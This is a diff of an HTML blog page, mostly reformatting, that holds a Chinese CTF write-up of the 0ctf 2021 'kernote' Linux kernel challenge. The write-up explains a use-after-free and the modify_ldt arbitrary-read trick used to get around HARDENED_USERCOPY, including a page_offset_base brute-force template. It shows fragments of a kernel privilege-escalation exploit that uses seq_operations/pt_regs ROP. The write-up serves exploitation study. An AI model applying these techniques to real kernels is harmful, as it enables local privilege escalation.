@@ -220,7 +220,7 @@
           <a href="https://hikawa.ml/" title="https:&#x2F;&#x2F;hikawa.ml&#x2F;" rel="noopener" target="_blank">Akira</a>
         </li>
         <li class="links-of-blogroll-item">
-          <a href="https://x9un.github.io/" title="https:&#x2F;&#x2F;x9un.github.io&#x2F;" rel="noopener" target="_blank">_357</a>
+          <a href="https://ugi57.github.io/" title="https:&#x2F;&#x2F;ugi57.github.io&#x2F;" rel="noopener" target="_blank">_357</a>
         </li>
         <li class="links-of-blogroll-item">
           <a href="https://altonhe.github.io/" title="https:&#x2F;&#x2F;altonhe.github.io&#x2F;" rel="noopener" target="_blank">Trotsky</a>
@@ -357,9 +357,11 @@
     <div class="post-body" itemprop="articleBody">
         <p>借此题来学习下 modify_ldt 在 linux kernel 中的利用思路</p>
 <span id="more"></span>
-
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>出题人公开的题目附件以及wp：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/YZloser/My-CTF-Challenges/tree/master/0ctf-2021-final/kernote">https://github.com/YZloser/My-CTF-Challenges/tree/master/0ctf-2021-final/kernote</a></p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="前置信息"><a href="#前置信息" class="headerlink" title="前置信息"></a>前置信息</h3><p>题目提供了个  readme.md</p>
+<h2 id="环境搭建">环境搭建</h2>
+<p>出题人公开的题目附件以及wp：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/YZloser/My-CTF-Challenges/tree/master/0ctf-2021-final/kernote">https://github.com/YZloser/My-CTF-Challenges/tree/master/0ctf-2021-final/kernote</a></p>
+<h2 id="漏洞分析">漏洞分析</h2>
+<h3 id="前置信息">前置信息</h3>
+<p>题目提供了个  <a target="_blank" rel="external nofollow noopener noreferrer" href="http://readme.md">readme.md</a></p>
 <blockquote>
 <p>Here are some kernel config options in case you need it</p>
 </blockquote>
@@ -369,7 +371,6 @@ CONFIG_SLAB_FREELIST_HARDENED&#x3D;y
 CONFIG_HARDENED_USERCOPY&#x3D;y
 CONFIG_STATIC_USERMODEHELPER&#x3D;y
 CONFIG_STATIC_USERMODEHELPER_PATH&#x3D;&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>根据该文件可以知道，kernel 使用了 <strong>slab</strong> 而不是默认的 slub 分配器，并且开启了一些缓解措施：</p>
 <ol>
 <li><strong>SLAB_FREELIST_RANDOM</strong>，free_list 会存在打乱顺序的情况，取到的 object 不可预测（<strong>这里挖个小坑</strong>）</li>
@@ -377,7 +378,7 @@ CONFIG_STATIC_USERMODEHELPER_PATH&#x3D;&quot;&quot;<span aria-hidden="true" clas
 <li><strong>HARDENED_USERCOPY</strong>，在使用 copy_to_user、copy_from_user 等函数时，会对内核空间的指针进行检查，对于内核 .text 地址空间，非堆栈空间，非 slab 分配的 object 空间的指针进行拷贝，会使得内核 panic</li>
 <li><strong>STATIC_USERMODEHELPER</strong>，modprobe_path 只读</li>
 </ol>
-<p>run.sh</p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="http://run.sh">run.sh</a></p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
 qemu-system-x86_64 <span class="token punctuation">\</span>
 -m 128M <span class="token punctuation">\</span>
@@ -393,17 +394,31 @@ qemu-system-x86_64 <span class="token punctuation">\</span>
 -s
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>开启了 <strong>kaslr</strong>，<strong>kpti</strong></p>
-<h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>漏洞模块 kernote.ko，只有一个 ioctl，且整个过程上自旋锁，根据 request（ioctl 第二个参数）进行不同的操作</p>
-<h4 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h4><p>request = 0x6667，从 <code>kmalloc_caches[5]</code> 也就是 <code>kmalloc-32</code> 中分配一个 object，存储到全局 buf 数组里<br><img src="/images/5b4f46e3/pasted-0.png" alt="note add"></p>
-<h4 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h4><p>request = 0x6668，释放指定 index 的 object，相关指针也置为了 NULL<br><img src="/images/5b4f46e3/pasted-1.png" alt="note delete"></p>
-<h4 id="SELECT"><a href="#SELECT" class="headerlink" title="SELECT"></a>SELECT</h4><p>request = 0x6666，复制指定 index 的指针到全局变量 note 里<br><img src="/images/5b4f46e3/pasted-3.png" alt="note select"></p>
-<h4 id="EDIT"><a href="#EDIT" class="headerlink" title="EDIT"></a>EDIT</h4><p>request = 0x6669，向 note 指针处写入 8 字节的 value<br><img src="/images/5b4f46e3/pasted-2.png" alt="note edit"></p>
-<h4 id="SHOW"><a href="#SHOW" class="headerlink" title="SHOW"></a>SHOW</h4><p>request = 0x666A，打印 note 指针指向的 8 字节值，但是前面有一些判断，其实就是判断当前用户是否为 root，只有为 root  才能用，所以这个功能没有用<br><img src="/images/5b4f46e3/pasted-4.png" alt="note show"><br><img src="/images/5b4f46e3/pasted-5.png" alt="note show print"></p>
+<h3 id="逆向分析">逆向分析</h3>
+<p>漏洞模块 kernote.ko，只有一个 ioctl，且整个过程上自旋锁，根据 request（ioctl 第二个参数）进行不同的操作</p>
+<h4 id="ADD">ADD</h4>
+<p>request = 0x6667，从 <code>kmalloc_caches[5]</code> 也就是 <code>kmalloc-32</code> 中分配一个 object，存储到全局 buf 数组里<br>
+<img src="/images/5b4f46e3/pasted-0.png" alt="note add"></p>
+<h4 id="DELETE">DELETE</h4>
+<p>request = 0x6668，释放指定 index 的 object，相关指针也置为了 NULL<br>
+<img src="/images/5b4f46e3/pasted-1.png" alt="note delete"></p>
+<h4 id="SELECT">SELECT</h4>
+<p>request = 0x6666，复制指定 index 的指针到全局变量 note 里<br>
+<img src="/images/5b4f46e3/pasted-3.png" alt="note select"></p>
+<h4 id="EDIT">EDIT</h4>
+<p>request = 0x6669，向 note 指针处写入 8 字节的 value<br>
+<img src="/images/5b4f46e3/pasted-2.png" alt="note edit"></p>
+<h4 id="SHOW">SHOW</h4>
+<p>request = 0x666A，打印 note 指针指向的 8 字节值，但是前面有一些判断，其实就是判断当前用户是否为 root，只有为 root  才能用，所以这个功能没有用<br>
+<img src="/images/5b4f46e3/pasted-4.png" alt="note show"><br>
+<img src="/images/5b4f46e3/pasted-5.png" alt="note show print"></p>
 <hr>
 <p>显然这里存在一个 UAF，<strong>SELECT</strong> 后再 <strong>DELETE</strong>，此时 object 已经被释放，但是 <strong>EDIT</strong> 操作使用的 note 指针仍指向被释放的 object</p>
-<h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>可以 UAF 32 字节的 object，且只能写入前 8 字节的数据</p>
+<h2 id="利用分析">利用分析</h2>
+<p>可以 UAF 32 字节的 object，且只能写入前 8 字节的数据</p>
 <p>首先可以想到的就是劫持 <strong>seq_operations</strong> 结构体的 start 指针，利用 <strong>pt_regs</strong> 结构体进行 ROP</p>
-<h3 id="modify-ldt"><a href="#modify-ldt" class="headerlink" title="modify_ldt"></a>modify_ldt</h3><p>但是还需要泄露内核地址，参考官方题解，了解到 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/include/asm/mmu_context.h#L36"><code>ldt_struct</code></a> 这么一个结构体</p>
+<h3 id="modify-ldt">modify_ldt</h3>
+<p>但是还需要泄露内核地址，参考官方题解，了解到 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/include/asm/mmu_context.h#L36"><code>ldt_struct</code></a> 这么一个结构体</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/*
  * ldt_structs can be allocated, used, and freed, but they are never
  * modified while live.
@@ -429,7 +444,6 @@ qemu-system-x86_64 <span class="token punctuation">\</span>
 	 */</span>
 	<span class="token keyword">int</span>			slot<span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>大小为 32 字节，entries 指向 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/include/asm/desc_defs.h#L16"><code>desc_struct</code></a> 段描述符：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* 8 byte segment descriptor */</span>
 <span class="token keyword">struct</span> <span class="token class-name">desc_struct</span> <span class="token punctuation">&#123;</span>
@@ -438,8 +452,7 @@ qemu-system-x86_64 <span class="token punctuation">\</span>
 	u16	base1<span class="token operator">:</span> <span class="token number">8</span><span class="token punctuation">,</span> type<span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span> s<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> dpl<span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> p<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>
 	u16	limit1<span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span> avl<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> l<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> d<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> g<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> base2<span class="token operator">:</span> <span class="token number">8</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>packed<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><del>不了解段描述符是什么东西的读者可以复习下操作系统课程</del></p>
+<p><s>不了解段描述符是什么东西的读者可以复习下操作系统课程</s></p>
 <p>linux 还提供了一个系统调用<a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/kernel/ldt.c#L659"><code>modify_ldt</code></a>来修改 <code>ldt_struct</code>：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">SYSCALL_DEFINE3</span><span class="token punctuation">(</span>modify_ldt<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token punctuation">,</span> func <span class="token punctuation">,</span> <span class="token keyword">void</span> __user <span class="token operator">*</span> <span class="token punctuation">,</span> ptr <span class="token punctuation">,</span>
 		<span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token punctuation">,</span> bytecount<span class="token punctuation">)</span>
@@ -494,8 +507,8 @@ qemu-system-x86_64 <span class="token punctuation">\</span>
 	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>  lm<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
 <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="read-ldt"><a href="#read-ldt" class="headerlink" title="read_ldt"></a>read_ldt</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">read_ldt</span><span class="token punctuation">(</span><span class="token keyword">void</span> __user <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> bytecount<span class="token punctuation">)</span>
+<h4 id="read-ldt">read_ldt</h4>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">read_ldt</span><span class="token punctuation">(</span><span class="token keyword">void</span> __user <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> bytecount<span class="token punctuation">)</span>
 <span class="token punctuation">&#123;</span>
 	<span class="token keyword">struct</span> <span class="token class-name">mm_struct</span> <span class="token operator">*</span>mm <span class="token operator">=</span> current<span class="token operator">-></span>mm<span class="token punctuation">;</span>
 	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> entries_size<span class="token punctuation">;</span>
@@ -517,9 +530,9 @@ out_unlock<span class="token operator">:</span>
 	<span class="token function">up_read</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mm<span class="token operator">-></span>context<span class="token punctuation">.</span>ldt_usr_sem<span class="token punctuation">)</span><span class="token punctuation">;</span>
 	<span class="token keyword">return</span> retval<span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>可以看到使用 copy_to_user 从 entries 指针向用户空间拷贝数据</p>
-<h4 id="write-ldt"><a href="#write-ldt" class="headerlink" title="write_ldt"></a>write_ldt</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">write_ldt</span><span class="token punctuation">(</span><span class="token keyword">void</span> __user <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> bytecount<span class="token punctuation">,</span> <span class="token keyword">int</span> oldmode<span class="token punctuation">)</span>
+<h4 id="write-ldt">write_ldt</h4>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">write_ldt</span><span class="token punctuation">(</span><span class="token keyword">void</span> __user <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> bytecount<span class="token punctuation">,</span> <span class="token keyword">int</span> oldmode<span class="token punctuation">)</span>
 <span class="token punctuation">&#123;</span>
 	<span class="token keyword">struct</span> <span class="token class-name">mm_struct</span> <span class="token operator">*</span>mm <span class="token operator">=</span> current<span class="token operator">-></span>mm<span class="token punctuation">;</span>
 	<span class="token keyword">struct</span> <span class="token class-name">ldt_struct</span> <span class="token operator">*</span>new_ldt<span class="token punctuation">,</span> <span class="token operator">*</span>old_ldt<span class="token punctuation">;</span>
@@ -568,7 +581,6 @@ out_unlock<span class="token operator">:</span>
 	new_ldt<span class="token operator">-></span>entries<span class="token punctuation">[</span>ldt_info<span class="token punctuation">.</span>entry_number<span class="token punctuation">]</span> <span class="token operator">=</span> ldt<span class="token punctuation">;</span>
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>write_ldt 使用 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/kernel/ldt.c#L149"><code>alloc_ldt_struct</code></a> 来分配 <code>ldt_struct</code>：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ldt_struct</span> <span class="token operator">*</span><span class="token function">alloc_ldt_struct</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> num_entries<span class="token punctuation">)</span>
 <span class="token punctuation">&#123;</span>
@@ -577,9 +589,9 @@ out_unlock<span class="token operator">:</span>
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
 	<span class="token keyword">return</span> new_ldt<span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <hr>
-<h3 id="Leak"><a href="#Leak" class="headerlink" title="Leak"></a>Leak</h3><p>利用 modify_ldt 系统调用，不难想到一个 leak 内核地址的思路</p>
+<h3 id="Leak">Leak</h3>
+<p>利用 modify_ldt 系统调用，不难想到一个 leak 内核地址的思路</p>
 <ol>
 <li>ADD -&gt; SELECT -&gt; DELETE，构造 UAF</li>
 <li>通过 write_ldt 分配到被释放的 object</li>
@@ -589,7 +601,8 @@ out_unlock<span class="token operator">:</span>
 <p>由于 copy_to_user 访问无效的地址并不会造成内核 panic，只会返回非 0 值，最后导致 modify_ldt 返回 <code>-EFAULT</code>，我们可以直接爆破内核地址</p>
 <p>但是因为开启了 <strong>HARDENED_USERCOPY</strong>，当 copy_to_user 拷贝源地址为内核 .text 地址会造成 panic，因此不能直接爆破内核地址</p>
 <p>可以改而爆破 <code>direct mapping area</code>（线性映射区）的起始地址 <strong>page_offset_base</strong>，实际上大小为 1G，kmalloc 就是从这里分配内存，可以从这里搜索找到 task_struct 结构体，进一步泄露更多数据</p>
-<h4 id="Bruteforce"><a href="#Bruteforce" class="headerlink" title="Bruteforce"></a>Bruteforce</h4><p>爆破 <strong>page_offset_base</strong> 模板：</p>
+<h4 id="Bruteforce">Bruteforce</h4>
+<p>爆破 <strong>page_offset_base</strong> 模板：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c">    <span class="token class-name">uint64_t</span> page_offset_base <span class="token operator">=</span> <span class="token number">0xffff888000000000uLL</span><span class="token punctuation">;</span>
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
 	<span class="token keyword">struct</span> <span class="token class-name">user_desc</span> desc<span class="token punctuation">;</span>
@@ -612,8 +625,8 @@ out_unlock<span class="token operator">:</span>
         <span class="token punctuation">&#125;</span>
         <span class="token keyword">break</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="Searching"><a href="#Searching" class="headerlink" title="Searching"></a>Searching</h4><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.11.9/source/include/linux/sched.h#L973"><code>task_struct</code></a>存在一些有用的字段：</p>
+<h4 id="Searching">Searching</h4>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.11.9/source/include/linux/sched.h#L973"><code>task_struct</code></a>存在一些有用的字段：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token punctuation">&#123;</span>
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
 	<span class="token comment">/* Process credentials: */</span>
@@ -633,7 +646,6 @@ out_unlock<span class="token operator">:</span>
 	<span class="token keyword">struct</span> <span class="token class-name">files_struct</span>		<span class="token operator">*</span>files<span class="token punctuation">;</span>
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>其中 comm 为进程的名字，可以通过  <code>prctl(PR_SET_NAME, &quot;myname&quot;)</code> 来设置，通过该字段就能定位到 task_struct 的位置</p>
 <p>task_struct 还存在一个 files 字段，记录了进程打开的文件信息，结构体为 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.11.9/source/include/linux/fdtable.h#L49"><code>files_struct</code></a>：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">files_struct</span> <span class="token punctuation">&#123;</span>
@@ -656,7 +668,6 @@ out_unlock<span class="token operator">:</span>
 	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> full_fds_bits_init<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 	<span class="token keyword">struct</span> <span class="token class-name">file</span> __rcu <span class="token operator">*</span> fd_array<span class="token punctuation">[</span>NR_OPEN_DEFAULT<span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>跟踪 fd_array 字段，即结构体 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.11.9/source/include/linux/fs.h#L915"><code>file</code></a></p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token punctuation">&#123;</span>
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
@@ -664,9 +675,9 @@ out_unlock<span class="token operator">:</span>
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
 <span class="token punctuation">&#125;</span> __randomize_layout
   <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">/* lest something weird decides that 2 is OK */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>读取 f_op 指针即可获取到内核地址</p>
-<h4 id="Safe-Leak"><a href="#Safe-Leak" class="headerlink" title="Safe Leak"></a>Safe Leak</h4><p>直接搜索整个线性映射区域仍有可能触发 <strong>HARDENED_USERCOPY</strong> 的检查，官方利用 fork 时，调用 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/kernel/ldt.c#L443"><code>ldt_dup_context</code></a> 拷贝 ldt 来安全的 leak 数据</p>
+<h4 id="Safe-Leak">Safe Leak</h4>
+<p>直接搜索整个线性映射区域仍有可能触发 <strong>HARDENED_USERCOPY</strong> 的检查，官方利用 fork 时，调用 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/kernel/ldt.c#L443"><code>ldt_dup_context</code></a> 拷贝 ldt 来安全的 leak 数据</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/*
  * Called on fork from arch_dup_mmap(). Just copy the current LDT state,
  * the new task is not running, so nothing can be installed.
@@ -678,7 +689,6 @@ out_unlock<span class="token operator">:</span>
 	       new_ldt<span class="token operator">-></span>nr_entries <span class="token operator">*</span> LDT_ENTRY_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>因为这里使用的是 memcpy，发生在内核空间内的拷贝，并不会有 HARDENED_USERCOPY 检查，只要再父进程 UAF 修改 entries，fork 后子进程进行 read_ldt，即可安全的进行任意地址读</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span>
 
@@ -702,11 +712,13 @@ out_unlock<span class="token operator">:</span>
 
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
 	<span class="token function">safe_read</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <hr>
-<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>有了内核地址后，再次构造 UAF 劫持 <strong>seq_operations</strong>，利用 <strong>pt_regs</strong> 进行 ROP 即可</p>
-<p>具体参考：<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x04-pt-regs-%E4%B8%8E%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%9B%B8%E5%85%B3">https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x04-pt-regs-%E4%B8%8E%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%9B%B8%E5%85%B3</a></p>
-<h3 id="完整-EXP"><a href="#完整-EXP" class="headerlink" title="完整 EXP"></a>完整 EXP</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// gcc -masm=intel -pthread -static -o exp exp.c</span>
+<h3 id="ROP">ROP</h3>
+<p>有了内核地址后，再次构造 UAF 劫持 <strong>seq_operations</strong>，利用 <strong>pt_regs</strong> 进行 ROP 即可</p>
+<p>具体参考：<br>
+<a target="_blank" rel="external nofollow noopener noreferrer" href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x04-pt-regs-%E4%B8%8E%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%9B%B8%E5%85%B3">https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x04-pt-regs-与系统调用相关</a></p>
+<h3 id="完整-EXP">完整 EXP</h3>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// gcc -masm=intel -pthread -static -o exp exp.c</span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span></span>
 
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
@@ -927,8 +939,8 @@ out_unlock<span class="token operator">:</span>
 
 	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="回到一切开始前"><a href="#回到一切开始前" class="headerlink" title="回到一切开始前"></a>回到一切开始前</h2><p>在 leak 和 劫持 seq_operations 时有一个小细节，就是因为 <strong>SLAB_FREELIST_RANDOM</strong> 的开启，无法预测从 free_list 中分配到 object</p>
+<h2 id="回到一切开始前">回到一切开始前</h2>
+<p>在 leak 和 劫持 seq_operations 时有一个小细节，就是因为 <strong>SLAB_FREELIST_RANDOM</strong> 的开启，无法预测从 free_list 中分配到 object</p>
 <p>exp 中下面怎么可以确定新分配的 ldt_struct 就一定是刚释放的 object 呢？</p>
